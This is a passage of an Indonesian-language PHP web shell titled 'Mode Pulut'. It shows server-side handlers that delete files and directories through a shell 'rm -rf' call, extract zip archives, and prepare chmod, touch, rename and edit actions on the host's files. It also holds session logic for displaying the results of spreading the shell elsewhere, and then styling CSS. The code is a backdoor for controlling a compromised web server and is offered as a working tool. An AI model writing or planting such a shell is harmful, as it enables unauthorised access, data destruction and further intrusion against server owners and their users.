            if (!headers_sent()) {
                header("Location: " . $pengalihan);
                exit;
            } else {
                echo '<script>window.location.href="' . $pengalihan . '";</script>';
                exit;
            }
        }
    }
    
    $_SESSION['pesan'] = $pesan;
    $_SESSION['keluaran_perintah'] = $keluaran_perintah;
    
    $pengalihan = $_SERVER['PHP_SELF'] . "?__d__=" . urlencode($__dir__);
    if (!headers_sent()) {
        header("Location: " . $pengalihan);
        exit;
    } else {
        echo '<script>window.location.href="' . $pengalihan . '";</script>';
        exit;
    }
}

// ==================== OPERASI GET ====================
if (isset($_GET['__hapus__'])) {
    $target = $__dir__ . basename($_GET['__hapus__']);
    if (@file_exists($target)) {
        if (@is_dir($target)) {
            eksekusiLokal("rm -rf " . escapeshellarg($target), $__dir__);
        } else {
            @unlink($target);
        }
        $pesan[] = "🗑 Dihapus: " . basename($target);
        $_SESSION['pesan'] = $pesan;
        $pengalihan = $_SERVER['PHP_SELF'] . "?__d__=" . urlencode($__dir__);
        header("Location: " . $pengalihan);
        exit;
    }
}

if (isset($_GET['__ekstrak__'])) {
    $target = $__dir__ . basename($_GET['__ekstrak__']);
    if (@file_exists($target) && pathinfo($target, PATHINFO_EXTENSION) === 'zip') {
        if (class_exists('ZipArchive')) {
            $zip = new ZipArchive();
            if ($zip->open($target) === TRUE) {
                $zip->extractTo($__dir__);
                $zip->close();
                $pesan[] = "📦 Diekstrak: " . basename($target);
                $_SESSION['pesan'] = $pesan;
                $pengalihan = $_SERVER['PHP_SELF'] . "?__d__=" . urlencode($__dir__);
                header("Location: " . $pengalihan);
                exit;
            }
        }
    }
}

if (isset($_GET['__chmod__'])) {
    $chmod_file = basename($_GET['__chmod__']);
}

if (isset($_GET['__sentuh__'])) {
    $sentuh_file = basename($_GET['__sentuh__']);
}

if (isset($_GET['__ganti_nama__'])) {
    $ganti_nama_file = basename($_GET['__ganti_nama__']);
}

if (isset($_GET['__edit__'])) {
    $file_diedit = basename($_GET['__edit__']);
    $konten_file = @file_get_contents($__dir__ . $file_diedit);
}

if (isset($_GET['keluar'])) {
    session_destroy();
    echo '<script>window.location.href="?";</script>';
    exit;
}

// Jika ada parameter tampil_link, tampilkan hasil penyebaran
$tampilkan_hasil_sebar = isset($_GET['__tampil_link__']) && isset($_SESSION['hasil_sebar']);

// Jika tidak ada tampil_link, hapus hasil_sebar dari session
if (!isset($_GET['__tampil_link__']) && isset($_SESSION['hasil_sebar'])) {
    unset($_SESSION['hasil_sebar']);
}

$_SESSION['pesan'] = $pesan;
?>

<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>🍚 Mode Pulut</title>
    <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@400;500;700;900&family=Exo+2:wght@300;400;500;600&display=swap" rel="stylesheet">
    <style>
        :root {
            --biru-neon: #198f36;
            --ungu-neon: #979797;
            --merah-muda-neon: #d0ff00;
            --cyan-neon: #00ffff;
            --gelap-kosmik: #424249;
            --putih-bintang: #ffffff;
            --ungu-nebula: #397896;
        }
        
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        
        body {
            font-family: 'Exo 2', sans-serif;
            background: #000;
            color: #fff;
            min-height: 100vh;
            position: relative;
            overflow-x: hidden;
        }
        
        .latar-utama {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: 
                radial-gradient(circle at 10% 20%, rgba(74, 0, 224, 0.4) 0%, transparent 40%),
                radial-gradient(circle at 90% 80%, rgba(0, 210, 255, 0.3) 0%, transparent 40%),
                radial-gradient(circle at 50% 50%, rgba(255, 0, 255, 0.2) 0%, transparent 50%),
                linear-gradient(135deg, #000000 0%, #0a0a2a 50%, #1a0033 100%);
        
